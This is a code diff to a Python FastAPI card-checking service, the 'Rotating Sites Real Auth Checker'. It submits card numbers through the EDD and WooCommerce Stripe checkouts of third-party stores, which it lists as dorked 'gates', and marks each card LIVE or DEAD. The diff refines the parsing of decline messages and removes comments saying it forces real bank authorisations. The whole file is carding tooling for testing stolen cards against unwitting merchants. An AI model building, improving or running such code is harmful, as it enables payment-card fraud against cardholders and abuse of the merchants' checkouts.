@@ -23,7 +23,7 @@ logging.basicConfig(
 )
 logger = logging.getLogger("ollie.rotating.checker")
 
-app = FastAPI(title="Rotating Sites Real Auth Checker", version="9.0.0")
+app = FastAPI(title="Rotating Sites Real Auth Checker", version="9.1.0")
 
 RAW_DORK_GATES: dict[str, dict[str, str]] = {
     "astra_store": {
@@ -256,7 +256,6 @@ async def execute_astra_auth(session: AsyncSession, cc: str, mm: str, yy: str, c
     tds = (card_meta.get("three_d_secure_usage") or {}).get("supported")
     tag_meta = f"{brand}/{funding}/{country_code}" + ("/3DS" if tds else "")
 
-    # Real Auth: Ipinapasa natin sa EDD Backend Ajax para piliting i-process ng Stripe Gateway ang transaction
     checkout_payload = {
         "edd_action": "purchase", "edd_email": email, "edd_first": first, "edd_last": last,
         "billing_country": "US", "card_state": state_code, "card_zip": postcode,
@@ -274,16 +273,20 @@ async def execute_astra_auth(session: AsyncSession, cc: str, mm: str, yy: str, c
         if "order-received" in res.url or "success" in res_text.lower():
             return "LIVE", f"Auth Approved Successfully | {tag_meta}", res.status_code
         
-        # Pagkuha ng eksaktong error message mula sa EDD/Stripe server response
-        clean_msg = re.sub(r"<[^>]+>", "", res_text).strip()
-        if not clean_msg or "error" in clean_msg.lower():
-            try:
-                rj = res.json()
-                clean_msg = rj.get("message") or rj.get("error") or "Card declined by gateway"
-            except Exception:
-                clean_msg = "Card declined by gateway"
-        return "DEAD", f"{clean_msg[:80]} | {tag_meta}", res.status_code
-    except Exception as e:
+        err_msg = "Card declined by gateway"
+        try:
+            rj = res.json()
+            if isinstance(rj, dict):
+                err_msg = rj.get("message") or rj.get("error") or err_msg
+            elif isinstance(rj, list) and len(rj) > 0:
+                err_msg = str(rj[0])
+        except Exception:
+            clean_html = re.sub(r"<[^>]+>", "", res_text).strip()
+            if clean_html:
+                err_msg = clean_html[:80]
+                
+        return "DEAD", f"{err_msg} | {tag_meta}", res.status_code
+    except Exception:
         return "DEAD", f"Card declined by gateway | {tag_meta}", res.status_code
 
 
@@ -379,7 +382,6 @@ async def execute_rollerco_auth(session: AsyncSession, cc: str, mm: str, yy: str
     tds = (card_meta.get("three_d_secure_usage") or {}).get("supported")
     tag_meta = f"{brand}/{funding}/{country_code}" + ("/3DS" if tds else "")
 
-    # Real Auth: Ipinapasa sa WooCommerce Checkout Ajax para kumuha ng totoong bank response (Live/Decline/3DS)
     checkout_payload = {
         "billing_email": email, "billing_first_name": first, "billing_last_name": last,
         "billing_phone": phone, "billing_country": "AU", "billing_address_1": "23 Endeavour Drive",
